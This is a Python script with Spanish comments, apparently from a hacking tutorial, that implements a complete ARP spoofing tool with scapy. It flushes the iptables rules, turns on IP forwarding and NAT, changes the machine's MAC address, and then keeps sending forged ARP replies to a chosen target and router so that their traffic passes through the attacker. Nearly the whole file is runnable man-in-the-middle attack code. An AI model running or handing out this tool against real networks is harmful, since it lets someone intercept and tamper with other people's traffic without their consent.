#!/usr/bin/env python3

import os
import argparse
import subprocess
import scapy.all as scapy
import time
import signal
import sys
import uuid

from termcolor import colored


def def_handler(sig,frame): # Creamos una función para gestionar la lógica al pulsar Ctrl+C
  print(colored(f"\n[!] Saliendo del programa...\n","red"))
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Capturamos el Ctrl+C


def get_arguments(): # Creamos una función para gestionar la lógica al recibir parámetros
  parser=argparse.ArgumentParser(description="ARP Spoofer")
  parser.add_argument("-t", "--target", required=True,dest="ip_address", help="Host / IP Range to Spoof")
  parser.add_argument("-r","--router", required=True,dest="ip_router",help="Router IP to Spoof")

  return parser.parse_args()


def root(): # Creamos una función donde gestionamos la lógica para comprobar si estamos ejecuntando el script con el usuario root
  if subprocess.check_output(["whoami"]).decode().strip() == 'root':
    return True


def requirements(): # Creamos una función donde gestionamos la lógica para cambiar archivos del sistema necesarios
  os.system("iptables --flush")
  os.system("iptables --policy FORWARD ACCEPT")
  os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
  os.system("iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE")
  os.system("iptables -A FORWARD -i ens33 -j ACCEPT")
  os.system("macchanger ens33 -m aa:bb:cc:44:55:66 >/dev/null")


def spoof(ip_address,spoof_ip): # Creamos una función donde gestionamos la lógica para envenenar el arp

  arp_packet=scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") # Creamos un paquete ARP reply, op=2(Reply), 
                                                                        #psrc=spoof_ip(Ip origen), pdst=ip_address(Ip destino), hwsrc=mac(MAC origen)
  scapy.send(arp_packet, verbose=False) # Mandamos el paquete ARP


def main():
  if root(): # Si estamos ejecutando el script con el usuario root
    requirements()
    arguments=get_arguments()
    while True: # Con un bucle infinito envenenamos al router y la ip indicada
      spoof(arguments.ip_address, arguments.ip_router)
      spoof(arguments.ip_router, arguments.ip_address)
      time.sleep(2) # 3 segundos de espera
  else:
    print(colored("\n[!] Este script necesita ser ejecutado por el usuario root.","red"))


if __name__=='__main__':
  main()
